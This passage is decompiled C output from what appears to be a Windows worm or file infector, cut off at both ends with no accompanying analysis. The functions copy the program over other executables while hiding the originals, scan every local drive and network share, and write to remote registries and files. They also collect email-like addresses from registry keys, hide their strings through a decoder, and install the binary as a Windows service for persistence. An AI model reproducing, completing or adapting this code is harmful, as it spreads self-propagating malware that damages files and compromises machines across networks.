  v1 = LoadLibraryA_0(v0);
  if ( v1 )
  {
    v2 = sub_40347E(ProcName, 1);
    dword_493908 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress_0(v1, v2);
    v3 = sub_40347E(ProcName, 4);
    dword_493904 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress_0(v1, v3);
    v4 = sub_40347E(ProcName, 5);
    dword_49390C = (int (__cdecl *)(_DWORD))GetProcAddress_0(v1, v4);
  }
  v5 = sub_40347E(LibFileName, 3);
  v6 = LoadLibraryA_0(v5);
  if ( v6 )
  {
    v7 = sub_40347E(ProcName, 3);
    dword_493910 = (int (__stdcall *)(_DWORD, _DWORD))GetProcAddress_0(v6, v7);
  }
  result = LoadLibraryA_0(aU11);
  v9 = result;
  if ( result )
  {
    v10 = sub_40347E(aU11, 1);
    result = (HMODULE)GetProcAddress_0(v9, v10);
    dword_493914 = (int (__stdcall *)(_DWORD, _DWORD))result;
  }
  return result;
}
// 493904: using guessed type int (__cdecl *dword_493904)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 493908: using guessed type int (__cdecl *dword_493908)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 49390C: using guessed type int (__cdecl *dword_49390C)(_DWORD);
// 493910: using guessed type int (__stdcall *dword_493910)(_DWORD, _DWORD);
// 493914: using guessed type int (__stdcall *dword_493914)(_DWORD, _DWORD);

//----- (00405873) --------------------------------------------------------
int __cdecl sub_405873(LPCSTR FullPath)
{
  char Dir[260]; // [esp+10h] [ebp-64Ch] BYREF
  char v4[260]; // [esp+114h] [ebp-548h] BYREF
  CHAR Filename[260]; // [esp+218h] [ebp-444h] BYREF
  char Source[260]; // [esp+31Ch] [ebp-340h] BYREF
  CHAR FileName[260]; // [esp+420h] [ebp-23Ch] BYREF
  CHAR NewFileName[260]; // [esp+524h] [ebp-138h] BYREF
  struct _FILETIME CreationTime; // [esp+628h] [ebp-34h] BYREF
  char v10[16]; // [esp+640h] [ebp-1Ch] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+650h] [ebp-Ch] BYREF
  int v12; // [esp+654h] [ebp-8h] BYREF
  int v13; // [esp+658h] [ebp-4h]
  LPCSTR lpFileName; // [esp+664h] [ebp+8h]
  LPCSTR lpFileNamea; // [esp+664h] [ebp+8h]
  CHAR *lpFileNameb; // [esp+664h] [ebp+8h]

  sub_40174B(v10);
  nNumberOfBytesToWrite = 0;
  if ( sub_404825(FullPath) || sub_405173(FullPath) )
    return 0;
  v13 = sub_4034AE(byte_410CFB, 0);
  _splitpath(FullPath, 0, 0, v4, 0);
  lpFileName = 0;
  if ( v13 > 0 )
  {
    while ( !*sub_40347E(byte_410CFB, (int)lpFileName) || !sub_403C88() )
    {
      if ( (int)++lpFileName >= v13 )
        goto LABEL_7;
    }
    return 0;
  }
LABEL_7:
  sub_403E97(NewFileName);
  GetModuleFileNameA(0, Filename, 0x104u);
  if ( !CopyFileA(Filename, NewFileName, 0) )
    return 0;
  SetFileAttributesA(NewFileName, 0x20u);
  if ( !sub_404E1A((int)NewFileName, FullPath, 86016)
    || (lpFileNamea = (LPCSTR)sub_40174E((int)v10, FullPath, (int)&v12, 0)) == 0 )
  {
LABEL_17:
    sub_403F05(NewFileName);
    return 0;
  }
  if ( (unsigned int)v12 <= 0x15000 )
    goto LABEL_16;
  if ( (unsigned int)v12 >= 0x300000 )
    goto LABEL_16;
  _splitpath(FullPath, FileName, Dir, Filename, 0);
  strcat(FileName, Dir);
  strcat(FileName, Filename);
  strcat(FileName, asc_40F0AC);
  sub_40372F(Source, 3, 3, 4);
  Source[0] = tolower_0(Source[0]);
  strcat(FileName, Source);
  lpFileNameb = (CHAR *)sub_40745D((int)lpFileNamea, v12, &nNumberOfBytesToWrite);
  if ( !lpFileNameb )
  {
LABEL_16:
    sub_401808((int)v10);
    goto LABEL_17;
  }
  sub_401808((int)v10);
  sub_403DC6(FileName, lpFileNameb, nNumberOfBytesToWrite);
  sub_405522(FileName);
  SetFileAttributesA(FileName, 0x27u);
  v13 = sub_404138(FullPath, &CreationTime);
  SetFileAttributesA(FullPath, 0x20u);
  CopyFileA(NewFileName, FullPath, 0);
  sub_403F05(NewFileName);
  sub_407750();
  sub_405705(FullPath, Str1);
  if ( v13 )
    sub_404180(FullPath, &CreationTime);
  sub_407BEB(lpFileNameb);
  return 1;
}

//----- (00405B0F) --------------------------------------------------------
int __cdecl sub_405B0F(char *lpFileName)
{
  int *v1; // esi
  _BYTE *v2; // esi
  int v4; // esi
  CHAR *v5; // eax
  HANDLE v6; // eax
  char Filename[260]; // [esp+4h] [ebp-428h] BYREF
  char Dir[260]; // [esp+108h] [ebp-324h] BYREF
  char Ext; // [esp+20Ch] [ebp-220h] BYREF
  char Source[259]; // [esp+20Dh] [ebp-21Fh] BYREF
  CHAR FileName[260]; // [esp+310h] [ebp-11Ch] BYREF
  char v12[16]; // [esp+414h] [ebp-18h] BYREF
  int v13; // [esp+424h] [ebp-8h] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+428h] [ebp-4h] BYREF

  sub_40174B(v12);
  nNumberOfBytesToWrite = 0;
  v1 = (int *)sub_40174E((int)v12, lpFileName, (int)&v13, 1);
  if ( !v1 )
    return 0;
  _splitpath(lpFileName, FileName, Dir, Filename, &Ext);
  strcat(FileName, Dir);
  strcat(FileName, Filename);
  Source[4] = 0;
  strcat(FileName, Source);
  strcat(FileName, a0);
  v2 = sub_40756C(v1, v13, &nNumberOfBytesToWrite);
  if ( !v2 )
  {
    sub_401808((int)v12);
    return 0;
  }
  sub_401808((int)v12);
  sub_403DC6(FileName, v2, nNumberOfBytesToWrite);
  sub_407BEB(v2);
  v4 = 0;
  v5 = GetCommandLineA();
  v6 = sub_4047E2(FileName, v5);
  if ( v6 )
  {
    WaitForSingleObject(v6, 0xFFFFFFFF);
    sub_403F05(FileName);
    v4 = 1;
  }
  return v4;
}

//----- (00405C2E) --------------------------------------------------------
int __cdecl sub_405C2E(char *Dest, int a2)
{
  char *v2; // eax
  BYTE Data[260]; // [esp+0h] [ebp-104h] BYREF

  v2 = sub_40347E(SubKey, 5);
  sub_4045EF(HKEY_CURRENT_USER, v2, byte_4131A0, Data, (HKEY)0x104);
  return sub_404555((LPCSTR)Data, Dest, a2, 1);
}

//----- (00405C7A) --------------------------------------------------------
int __cdecl sub_405C7A(char *lpFileName, int a2)
{
  int v2; // edi
  int v3; // edi
  char *v4; // eax
  int v5; // edi
  char *v6; // eax
  char *v7; // esi
  int v8; // eax
  int v9; // edi
  DWORD v10; // edx
  char Ext[260]; // [esp+Ch] [ebp-20Ch] BYREF
  char Filename[260]; // [esp+110h] [ebp-108h] BYREF
  int v14; // [esp+214h] [ebp-4h]
  int i; // [esp+224h] [ebp+Ch]
  int v16; // [esp+224h] [ebp+Ch]

  v14 = 0;
  if ( !a2 )
  {
    v2 = sub_4034AE(&aO, 0);
    Filename[0] = 0;
    _splitpath(lpFileName, 0, 0, Filename, Ext);
    v3 = v2 - 1;
    for ( i = 0; i < v3; ++i )
    {
      v4 = sub_40347E(&aO, i);
      if ( !_strcmpi(Filename, v4) && i != v3 )
        v14 = 1;
    }
    strcat(Filename, Ext);
    v5 = 0;
    v16 = sub_4034AE(byte_410B1B, 0);
    if ( v16 > 0 )
    {
      do
      {
        v6 = sub_40347E(byte_410B1B, v5);
        if ( !_strcmpi(Filename, v6) )
          v14 = 1;
        ++v5;
      }
      while ( v5 < v16 );
    }
    if ( v14 )
    {
      v7 = lpFileName;
      sub_40347E(byte_410DF0, 1);
      if ( !sub_403C88() )
      {
        sub_403F05(lpFileName);
        return 1;
      }
    }
    else
    {
      v7 = lpFileName;
    }
    v8 = sub_403D4B(v7);
    v9 = v8;
    if ( v8 < 0 )
    {
      if ( v8 == -100 )
        sub_40704C(v7, -1, -1, 0);
    }
    else
    {
      sub_407750();
      if ( v9 < 5 )
      {
        sub_407750();
        sub_404555(v7, (char *)dword_4933D8, 512000, 1);
      }
    }
    v10 = 300 * dword_493918;
    if ( 300 * dword_493918 > 7000 )
      v10 = 1000 * (sub_4047B6(0) % 5u + 7);
    Sleep(v10);
    if ( ++dword_493918 > 10000 )
      dword_493918 = 0;
  }
  return 1;
}
// 41098B: using guessed type char aO;
// 493918: using guessed type int dword_493918;

//----- (00405E27) --------------------------------------------------------
int __cdecl sub_405E27(char *lpFileName, int a2, int a3)
{
  size_t v3; // eax
  int v4; // eax
  char Filename[260]; // [esp+4h] [ebp-30Ch] BYREF
  char v7[260]; // [esp+108h] [ebp-208h] BYREF
  char Dir[260]; // [esp+20Ch] [ebp-104h] BYREF

  _splitpath(lpFileName, 0, Dir, Filename, 0);
  if ( !a2 )
  {
    if ( a3 )
    {
      v4 = sub_403D0C(Filename);
    }
    else
    {
      v3 = strlen(Dir);
      if ( v3 )
        v7[v3 + 259] = 0;
      _splitpath(Dir, 0, 0, v7, 0);
      v4 = sub_403D0C(v7);
    }
    if ( v4 )
      sub_404555(lpFileName, (char *)dword_4933D8, 512000, 1);
  }
  return 1;
}

//----- (00405EC6) --------------------------------------------------------
int __cdecl sub_405EC6(char *Source)
{
  int v1; // esi
  int result; // eax

  v1 = 1;
  result = (int)sub_403C88();
  if ( result )
  {
    if ( sub_403C88() )
      v1 = 0;
    sub_403F1C(Source, (int)sub_405E27, v1);
    result = 1;
  }
  return result;
}

//----- (00405F08) --------------------------------------------------------
int __cdecl sub_405F08(int a1, char *Source, int Sourcea, int a4)
{
  int v4; // edi
  CHAR SubKey[1024]; // [esp+Ch] [ebp-B0Ch] BYREF
  CHAR Dst[1024]; // [esp+40Ch] [ebp-70Ch] BYREF
  char Filename[260]; // [esp+80Ch] [ebp-30Ch] BYREF
  char Dir[260]; // [esp+910h] [ebp-208h] BYREF
  CHAR Src[260]; // [esp+A14h] [ebp-104h] BYREF
  int v11; // [esp+B2Ch] [ebp+14h]

  *(_DWORD *)a4 = 0;
  sub_407750();
  strcat(SubKey, asc_40F044);
  strcat(SubKey, (const char *)Sourcea);
  sub_4045EF(HKEY_LOCAL_MACHINE, SubKey, 0, (LPBYTE)Dst, (HKEY)0x400);
  sub_407750();
  ExpandEnvironmentStringsA(Src, Dst, 0x104u);
  v11 = sub_4034AE(&aO, 0);
  _splitpath(Dst, 0, 0, Filename, 0);
  v4 = 0;
  if ( v11 <= 0 )
    goto LABEL_11;
  do
  {
    if ( *sub_40347E(&aO, v4) && sub_403C88() )
      break;
    ++v4;
  }
  while ( v4 < v11 );
  if ( v4 >= v11 )
  {
LABEL_11:
    if ( sub_403C88() )
      sub_405873(Dst);
  }
  _splitpath(Dst, Src, Dir, 0, 0);
  strcat(Src, Dir);
  sub_405EC6(Src);
  Sleep(0x3E8u);
  return 1;
}
// 41098B: using guessed type char aO;

//----- (00406066) --------------------------------------------------------
void __stdcall __noreturn sub_406066(LPVOID lpThreadParameter)
{
  CHAR SubKey[260]; // [esp+0h] [ebp-108h] BYREF
  int v2; // [esp+104h] [ebp-4h] BYREF

  while ( 1 )
  {
    SubKey[0] = 0;
    sub_403CE3(SubKey, 1);
    sub_404691(HKEY_LOCAL_MACHINE, SubKey, (int)sub_405F08, (int)&v2);
    Sleep(0x36EE80u);
  }
}

//----- (004060AE) --------------------------------------------------------
BOOL __cdecl sub_4060AE(char *Source, int a2, int a3)
{
  int v3; // eax
  BOOL result; // eax

  if ( a2 )
  {
    if ( sub_405EC6(Source) )
      result = 0;
    else
      result = a3 == 0;
  }
  else
  {
    if ( !a3 )
      Sleep(5u);
    v3 = sub_403D4B(Source);
    if ( v3 >= 0 && v3 < 3 )
      sub_407750();
    result = 1;
  }
  return result;
}

//----- (00406106) --------------------------------------------------------
int __stdcall sub_406106(int a1)
{
  char *v1; // eax
  char v2; // bl
  char v3; // al
  UINT v4; // eax
  CHAR RootPathName[2]; // [esp+4h] [ebp-10Ch] BYREF
  char v7; // [esp+6h] [ebp-10Ah]
  int v8; // [esp+108h] [ebp-8h]
  char v9; // [esp+10Fh] [ebp-1h]

  RootPathName[0] = 0;
  v1 = sub_40347E(&aU_0, 1);
  sub_4045EF(HKEY_LOCAL_MACHINE, SubKey, v1, (LPBYTE)RootPathName, (HKEY)0x104);
  sub_405EC6(RootPathName);
  v2 = v7;
  v3 = tolower_0(RootPathName[0]);
  v8 = 0;
  v9 = v3;
  do
  {
    if ( (_BYTE)v8 + 97 != v9 )
    {
      v7 = 0;
      RootPathName[0] = v8 + 97;
      v4 = GetDriveTypeA(RootPathName);
      v7 = v2;
      if ( v4 == 3 )
        sub_403F1C(RootPathName, (int)sub_4060AE, a1);
    }
    ++v8;
  }
  while ( v8 < 26 );
  return 0;
}
// 41096D: using guessed type char aU_0;

//----- (004061C0) --------------------------------------------------------
int __cdecl sub_4061C0(char *Str, char *Dest)
{
  signed int v2; // eax
  signed int i; // ecx

  sub_407750();
  v2 = strlen(Str);
  for ( i = 0; i < v2; ++i )
  {
    if ( Str[i] == 64 )
      break;
  }
  if ( i >= v2 - 1 )
    return 0;
  strcat(Dest, &Str[i + 1]);
  return 1;
}

//----- (0040620B) --------------------------------------------------------
BOOL __cdecl sub_40620B(char *Memory, char *Str, int a3)
{
  int v4; // eax
  int v5; // esi
  char v6[432]; // [esp+4h] [ebp-214h] BYREF
  char v7[100]; // [esp+1B4h] [ebp-64h] BYREF

  if ( !Data[0] || !byte_4931D0[0] )
    return 0;
  if ( a3 )
  {
    sub_401841(Memory);
    sub_402319((int)Memory, Str);
  }
  sub_402C3B(v6, (char *)Data, 25, 0x100u, 100);
  sub_40372F(v7, 3, 10, 4);
  sub_4030BF((int)v7);
  sub_40317D(v6, Memory + 100);
  sub_4030D4((int)v6, (char *)byte_4931D0);
  if ( sub_402D72((int)v6) )
  {
    sub_402D0D((int)v6);
    return 0;
  }
  v4 = strlen(Str);
  v5 = sub_402DCE((int)v6, (int)Str, v4);
  sub_402D0D((int)v6);
  return v5 == 0;
}

//----- (004062F0) --------------------------------------------------------
BOOL __cdecl sub_4062F0(int Memory, char *Str, int a3)
{
  int v4; // eax
  int v5; // esi
  char v6[260]; // [esp+4h] [ebp-318h] BYREF
  char v7[432]; // [esp+108h] [ebp-214h] BYREF
  char v8[100]; // [esp+2B8h] [ebp-64h] BYREF

  if ( !sub_4061C0((char *)Memory, v6) )
    return 0;
  if ( a3 )
  {
    sub_401841((char *)Memory);
    sub_402319(Memory, Str);
  }
  sub_402C3B(v7, v6, 25, 0x100u, 100);
  sub_40372F(v8, 3, 10, 4);
  sub_4030BF((int)v8);
  sub_40317D(v7, (char *)(Memory + 100));
  sub_4030D4((int)v7, (char *)Memory);
  if ( sub_402D72((int)v7) )
  {
    sub_402D0D((int)v7);
    return 0;
  }
  v4 = strlen(Str);
  v5 = sub_402DCE((int)v7, (int)Str, v4);
  sub_402D0D((int)v7);
  return v5 == 0;
}

//----- (004063D4) --------------------------------------------------------
BOOL __cdecl sub_4063D4(char *Str, int a2)
{
  char String1[1024]; // [esp+0h] [ebp-800h] BYREF
  char String2[1024]; // [esp+400h] [ebp-400h] BYREF

  String1[0] = 0;
  String2[0] = 0;
  sub_4061C0(Str, String1);
  sub_4061C0((char *)a2, String2);
  return _strcmpi(String1, String2) == 0;
}

//----- (00406426) --------------------------------------------------------
int __cdecl sub_406426(char *Str)
{
  int v1; // edi
  int v2; // ebx
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  char *v6; // eax
  int i; // edi
  char *v9; // [esp-8h] [ebp-24h]
  char *v10; // [esp-8h] [ebp-24h]
  int v11; // [esp+Ch] [ebp-10h]
  int v12; // [esp+Ch] [ebp-10h]
  int v13; // [esp+10h] [ebp-Ch]
  int v14; // [esp+14h] [ebp-8h]
  int lpMem; // [esp+18h] [ebp-4h]

  lpMem = -1;
  v1 = 0;
  v14 = 0;
  if ( !sub_4033F4(aHhh, Str, 4096, 1) )
  {
    v13 = sub_4034AE(aHhh, 0);
    if ( v13 > 0 )
    {
      do
      {
        v2 = 0;
        v11 = 0;
        if ( v1 <= 0 )
          goto LABEL_8;
        do
        {
          v9 = sub_40347E(aHhh, v2);
          v3 = sub_40347E(aHhh, v1);
          if ( sub_4063D4(v3, (int)v9) )
            v11 = 1;
          ++v2;
        }
        while ( v2 < v1 );
        if ( !v11 )
        {
LABEL_8:
          v4 = v1 + 1;
          v5 = 1;
          v12 = 1;
          if ( v1 + 1 < v13 )
          {
            do
            {
              v10 = sub_40347E(aHhh, v4);
              v6 = sub_40347E(aHhh, v1);
              if ( sub_4063D4(v6, (int)v10) )
                ++v12;
              ++v4;
            }
            while ( v4 < v13 );
            v5 = v12;
          }
          if ( v5 > v14 )
          {
            v14 = v5;
            lpMem = v1;
          }
        }
        ++v1;
      }
      while ( v1 < v13 );
      if ( v14 > 0 && lpMem >= 0 )
        sub_4034E0(aHhh, (void *)lpMem, 4096);
    }
    for ( i = 0; i < 10; ++i )
    {
      if ( sub_4033F4(aHhh, Str, 4096, 1) )
        break;
      sub_4034E0(aHhh, (void *)0xFFFFFFFF, 4096);
    }
  }
  return 1;
}

//----- (00406552) --------------------------------------------------------
int sub_406552()
{
  char *v0; // eax
  int result; // eax
  char *v2; // eax
  int v3; // [esp+10h] [ebp-204h]
  CHAR SubKey[512]; // [esp+14h] [ebp-200h] BYREF

  v3 = 1;
  while ( 1 )
  {
    Data[0] = 0;
    byte_4931D0[0] = 0;
    sprintf(SubKey, "%s%08d", aA5, v3);
    v0 = sub_40347E(aA5, 1);
    result = sub_4045EF(HKEY_CURRENT_USER, SubKey, v0, Data, (HKEY)0x104);
    if ( Data[0] )
    {
      v2 = sub_40347E(aA5, 2);
      result = sub_4045EF(HKEY_CURRENT_USER, SubKey, v2, byte_4931D0, (HKEY)0x104);
      if ( byte_4931D0[0] )
        break;
    }
    if ( ++v3 > 9 )
    {
      Data[0] = 0;
      byte_4931D0[0] = 0;
      return result;
    }
  }
  return result;
}

//----- (00406608) --------------------------------------------------------
DWORD __stdcall sub_406608(LPVOID lpThreadParameter)
{
  unsigned int v2; // eax
  char *v3; // eax
  bool v4; // zf
  int v5; // edx
  char *v6; // edi
  int v7; // eax
  signed int v8; // edx
  unsigned int v9; // eax
  char *v10; // eax
  char v11[4116]; // [esp+Ch] [ebp-3020h] BYREF
  char v12; // [esp+1020h] [ebp-200Ch]
  char v13[300]; // [esp+2288h] [ebp-DA4h] BYREF
  CHAR Filename[260]; // [esp+23B4h] [ebp-C78h] BYREF
  char Mem[2340]; // [esp+24B8h] [ebp-B74h] BYREF
  char Destination[300]; // [esp+2DDCh] [ebp-250h] BYREF
  CHAR NewFileName[260]; // [esp+2F08h] [ebp-124h] BYREF
  int v18; // [esp+300Ch] [ebp-20h]
  char *v19; // [esp+3010h] [ebp-1Ch]
  int i; // [esp+3014h] [ebp-18h]
  char *v21; // [esp+3018h] [ebp-14h]
  int v22; // [esp+301Ch] [ebp-10h]
  unsigned int v23; // [esp+3020h] [ebp-Ch]
  int v24; // [esp+3024h] [ebp-8h]
  int v25; // [esp+3028h] [ebp-4h]

  v21 = (char *)sub_407F8F(0x100000u);
  if ( v21 )
  {
    while ( !sub_40542A() )
      Sleep(0xEA60u);
    sub_405C2E((char *)dword_4933D8, 512000);
    sub_406106(1);
    sub_406552();
    GetModuleFileNameA(0, Filename, 0x104u);
    sub_403E97(NewFileName);
    v24 = 0;
    while ( 1 )
    {
      while ( !sub_40542A() )
        Sleep(0xEA60u);
      if ( !sub_403E63(NewFileName) )
      {
        CopyFileA(Filename, NewFileName, 0);
        SetFileAttributesA(NewFileName, 0x20u);
        sub_404FC5(NewFileName, 86016);
        v2 = sub_4047B6(0);
        sub_40406E(NewFileName, v2 % 0x2800 + 86528);
      }
      for ( i = sub_4034AE((char *)dword_4933D8, 0); v24 < i; ++v24 )
      {
        sub_407C00((unsigned int)v11, Str1, 0x227Au);
        v12 = 0;
        sub_405705(NewFileName, v11);
        memset(Mem, 0, sizeof(Mem));
        v3 = sub_40347E((char *)dword_4933D8, v24);
        v4 = *v3 == 0;
        v19 = v3;
        if ( !v4 )
        {
          sub_407750();
          v5 = sub_4047B6(0) % (unsigned int)i;
          if ( v5 == v24 )
            ++v5;
          if ( v5 >= i )
            v5 = 0;
          v6 = sub_40347E((char *)dword_4933D8, v5);
          if ( !*v6 )
            v6 = sub_40347E((char *)dword_4933D8, 0);
          sub_407750();
          sub_407750();
          sub_407750();
          if ( !sub_40620B(Mem, v21, 1) )
          {
            memset(Mem, 0, sizeof(Mem));
            sub_407750();
            sub_407750();
            sub_407750();
            sub_407750();
            if ( sub_4062F0((int)Mem, v21, 1) )
            {
              sub_406426(v6);
            }
            else
            {
              v7 = sub_4034AE(aHhh, 0);
              v18 = -1;
              v23 = v7;
              v22 = 0;
              do
              {
                memset(Mem, 0, sizeof(Mem));
                sub_407750();
                sub_407750();
                sub_407750();
                v8 = sub_4047B6(0) % v23;
                v25 = v8;
                if ( v8 == v18 )
                  v25 = ++v8;
                if ( v8 >= (int)v23 )
                  v25 = 0;
                sub_40347E(aHhh, v25);
                sub_407750();
                if ( sub_4062F0((int)Mem, v21, 1) )
                  break;
                ++v22;
                v18 = v25;
              }
              while ( v22 < 6 );
              if ( v22 >= 6 )
              {
                v23 = sub_4034AE(&aU_1, 0);
                v9 = sub_4047B6(0);
                v25 = v9 % v23;
                if ( (int)(v9 % v23) >= (int)v23 )
                  v25 = 0;
                sub_403BB8((int)v6, (int)Destination, v13);
                strcat(Destination, Str2);
                v10 = sub_40347E(&aU_1, v25);
                strcat(Destination, v10);
                memset(Mem, 0, sizeof(Mem));
                sub_407750();
                sub_407750();
                sub_407750();
                sub_407750();
                sub_4062F0((int)Mem, v21, 1);
              }
            }
          }
        }
      }
      Sleep(0x927C0u);
    }
  }
  return 0;
}
// 410E2C: using guessed type char aU_1;

//----- (00406A36) --------------------------------------------------------
const char *__usercall sub_406A36@<eax>(int a1@<ebx>, LPCSTR lpMachineName, int a3)
{
  const char *result; // eax
  char v4; // al
  int *v6; // [esp-4h] [ebp-56Ch]
  char Source[260]; // [esp+8h] [ebp-560h] BYREF
  struct HKEY__ phkResult; // [esp+10Ch] [ebp-45Ch] BYREF
  char v9[4]; // [esp+210h] [ebp-358h] BYREF
  CHAR FileName[260]; // [esp+314h] [ebp-254h] BYREF
  WCHAR v11[52]; // [esp+418h] [ebp-150h] BYREF
  WCHAR WideCharStr[32]; // [esp+480h] [ebp-E8h] BYREF
  WCHAR v13[20]; // [esp+4C0h] [ebp-A8h] BYREF
  CHAR LibFileName[32]; // [esp+4E8h] [ebp-80h] BYREF
  CHAR Destination[2]; // [esp+508h] [ebp-60h] BYREF
  char v16[28]; // [esp+50Ah] [ebp-5Eh] BYREF
  __int16 v17; // [esp+526h] [ebp-42h]
  int v18[8]; // [esp+528h] [ebp-40h] BYREF
  int v19; // [esp+548h] [ebp-20h] BYREF
  CHAR MultiByteStr[4]; // [esp+54Ch] [ebp-1Ch] BYREF
  int v21; // [esp+550h] [ebp-18h]
  __int16 v22; // [esp+554h] [ebp-14h]
  const char *v23; // [esp+558h] [ebp-10h]
  int v24; // [esp+55Ch] [ebp-Ch] BYREF
  const char *v25; // [esp+560h] [ebp-8h]
  int i; // [esp+564h] [ebp-4h]

  strcpy(Destination, "x");
  memset(v16, 0, sizeof(v16));
  v17 = 0;
  strcpy(MultiByteStr, "a:\\");
  result = 0;
  v21 = 0;
  v22 = 0;
  v19 = 32;
  v24 = 0;
  v25 = 0;
  if ( !dword_4938F0 )
  {
    if ( dword_493908 )
    {
      if ( !lpMachineName
        || (v6 = &v19, LoadLibraryA(LibFileName), (result = (const char *)_strcmpi(lpMachineName + 2, LibFileName)) != 0) )
      {
        v18[4] = -1;
        v18[6] = (int)v13;
        v18[0] = (int)v11;
        v18[2] = (int)v11;
        v18[1] = 0;
        v18[5] = 0;
        v18[7] = 0;
        v18[3] = 127;
        strcat(Destination, LibFileName);
        MultiByteToWideChar(0, 1u, lpMachineName, -1, WideCharStr, 34);
        for ( i = 2; i < 5; ++i )
        {
          MultiByteStr[0] = i + 65;
          MultiByteToWideChar(0, 1u, MultiByteStr, -1, v13, 20);
          Destination[0] = MultiByteStr[0];
          MultiByteToWideChar(0, 1u, Destination, -1, v11, 52);
          result = (const char *)dword_493908(WideCharStr, 2, v18, &v24, a1, v6);
          v23 = result;
          if ( a3 )
          {
            if ( !result && !v25 )
            {
              v4 = sub_4047B6(0);
              sub_404261(&phkResult, v4 & 1, (int)a0, 1);
              sub_407750();
              strcat(v9, Destination);
              result = (const char *)sub_40284D(lpMachineName, (int)v9, 0, &phkResult, 0, 1);
              v25 = result;
            }
            if ( !v23 )
            {
              sub_404261(Source, 0, (int)String2, 1);
              sub_407750();
              strcat(FileName, asc_40F044);
              strcat(FileName, Destination);
              strcat(FileName, asc_40F044);
              strcat(FileName, Source);
              result = sub_40704C(FileName, -1, -1, 1);
            }
          }
        }
      }
    }
  }
  return result;
}
// 493908: invalid function type has been ignored
// 406A36: could not find valid save-restore pair for ebx
// 406B63: variable 'a1' is possibly undefined
// 406B63: variable 'v6' is possibly undefined
// 4938F0: using guessed type int dword_4938F0;
// 493908: using guessed type int (__cdecl *dword_493908)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00406C65) --------------------------------------------------------
DWORD __cdecl sub_406C65(LPNETRESOURCEA lpNetResource, DWORD hEnum, int a3)
{
  DWORD result; // eax
  int *v4; // esi
  char v5; // al
  char v6; // al
  char Buffer[20]; // [esp+4h] [ebp-439Ch] BYREF
  char v8; // [esp+18h] [ebp-4388h] BYREF
  struct HKEY__ phkResult; // [esp+3E84h] [ebp-51Ch] BYREF
  char Source[260]; // [esp+3F88h] [ebp-418h] BYREF
  int v11[65]; // [esp+408Ch] [ebp-314h] BYREF
  CHAR MachineName[260]; // [esp+4190h] [ebp-210h] BYREF
  CHAR FileName[260]; // [esp+4294h] [ebp-10Ch] BYREF
  DWORD BufferSize; // [esp+4398h] [ebp-8h] BYREF
  DWORD cCount; // [esp+439Ch] [ebp-4h] BYREF
  LPNETRESOURCEA lpNetResourcea; // [esp+43A8h] [ebp+8h]

  cCount = -1;
  BufferSize = 16000;
  result = WNetOpenEnumA(hEnum, 1u, 3u, lpNetResource, (LPHANDLE)&hEnum);
  if ( !result )
  {
    WNetEnumResourceA((HANDLE)hEnum, &cCount, Buffer, &BufferSize);
    lpNetResourcea = 0;
    if ( cCount )
    {
      v4 = (int *)&v8;
      do
      {
        if ( (*(_BYTE *)(v4 - 2) & 2) != 0 )
        {
          sub_406C65((LPNETRESOURCEA)(v4 - 5), 2u, a3);
        }
        else if ( !sub_404BD2(*v4, MachineName, (int)v11) )
        {
          sub_406A36(0, MachineName, a3);
          v5 = sub_4047B6(0);
          sub_404261(&phkResult, v5 & 1, (int)a0, 1);
          if ( a3 )
          {
            sub_40284D(MachineName, (int)v11, 0, &phkResult, 0, 1);
            v6 = sub_4047B6(0);
            sub_404261(Source, v6 & 1, (int)String2, 1);
            sub_407750();
            strcat(FileName, asc_40F044);
            strcat(FileName, Source);
            sub_40704C(FileName, -1, -1, 1);
          }
        }
        lpNetResourcea = (LPNETRESOURCEA)((char *)lpNetResourcea + 1);
        v4 += 8;
      }
      while ( (unsigned int)lpNetResourcea < cCount );
    }
    result = WNetCloseEnum((HANDLE)hEnum);
  }
  return result;
}

//----- (00406DDE) --------------------------------------------------------
void __stdcall __noreturn sub_406DDE(LPVOID lpThreadParameter)
{
  int i; // eax

  for ( i = 1; ; i = 0 )
  {
    sub_406C65(0, 2u, i);
    Sleep(0x6DDD00u);
  }
}

//----- (00406DFD) --------------------------------------------------------
int sub_406DFD()
{
  unsigned int v0; // eax
  char *v1; // eax
  HMODULE v2; // ebp
  FARPROC v3; // eax
  SC_HANDLE v5; // ebp
  SC_HANDLE v6; // edi
  SC_HANDLE hSCObject; // [esp+10h] [ebp-2384h]
  SC_HANDLE hSCObjecta; // [esp+10h] [ebp-2384h]
  CHAR Filename[260]; // [esp+14h] [ebp-2380h] BYREF
  char v10[4116]; // [esp+118h] [ebp-227Ch] BYREF
  char v11; // [esp+112Ch] [ebp-1268h]

  GetModuleFileNameA(0, Filename, 0x104u);
  SetFileAttributesA((LPCSTR)&ApplicationName, 0x20u);
  hSCObject = (SC_HANDLE)CopyFileA(Filename, (LPCSTR)&ApplicationName, 0);
  SetFileAttributesA((LPCSTR)&ApplicationName, 0x20u);
  if ( hSCObject )
  {
    sub_407C00((unsigned int)v10, Str1, 0x227Au);
    v11 = 0;
    sub_405705((LPCSTR)&ApplicationName, v10);
    sub_404FC5((LPCSTR)&ApplicationName, 86016);
    v0 = sub_4047B6(0);
    sub_40406E((LPCSTR)&ApplicationName, v0 % 0x2800 + 86528);
  }
  sub_405522((LPCSTR)&ApplicationName);
  SetFileAttributesA((LPCSTR)&ApplicationName, 0x27u);
  if ( dword_4938F0 )
  {
    sub_40464B(HKEY_LOCAL_MACHINE, byte_4934E0, Destination, &ApplicationName);
    v1 = sub_40347E(LibFileName, 1);
    v2 = LoadLibraryA_0(v1);
    v3 = GetProcAddress_0(v2, ProcName);
    if ( v3 )
      ((void (__stdcall *)(_DWORD, int))v3)(0, 1);
    FreeLibrary(v2);
  }
  if ( !hSCObject )
    return 0;
  if ( dword_4938F0 )
  {
    sub_4047E2((LPCSTR)&ApplicationName, 0);
  }
  else if ( !dword_4938F8 )
  {
    hSCObjecta = OpenSCManagerA(0, 0, 2u);
    CreateServiceA(hSCObjecta, Destination, Destination, 0, 0x110u, 2u, 0, (LPCSTR)&ApplicationName, 0, 0, 0, 0, 0);
    CloseServiceHandle(hSCObjecta);
    v5 = OpenSCManagerA(0, 0, 1u);
